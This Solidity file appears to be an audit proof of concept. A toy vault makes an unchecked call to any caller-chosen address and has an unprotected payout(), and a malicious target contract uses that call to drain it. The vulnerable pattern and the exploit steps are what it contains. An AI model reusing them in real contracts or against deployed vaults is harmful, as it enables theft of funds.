// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IOracleTarget { function drain() external; }
contract OracleLess { uint256 public funds=1000; function fill(address target) external { (bool ok,)=target.call(abi.encodeWithSelector(IOracleTarget.drain.selector)); require(ok,"target"); } function payout(address) external { funds=0; } }
contract MaliciousTarget { OracleLess public vault; constructor(OracleLess v){vault=v;} function drain() external { vault.payout(msg.sender); } }
contract Exploit { OracleLess public vault; bool public harmed; event Proof(uint256 remaining);
    function run() external { vault=new OracleLess(); MaliciousTarget target=new MaliciousTarget(vault);
        // @> (uint256 amountOut,) = execute(target, txData, order); with attacker-controlled target/txData
        vault.fill(address(target)); harmed=vault.funds()==0; emit Proof(vault.funds()); require(harmed,"target restricted"); }
}
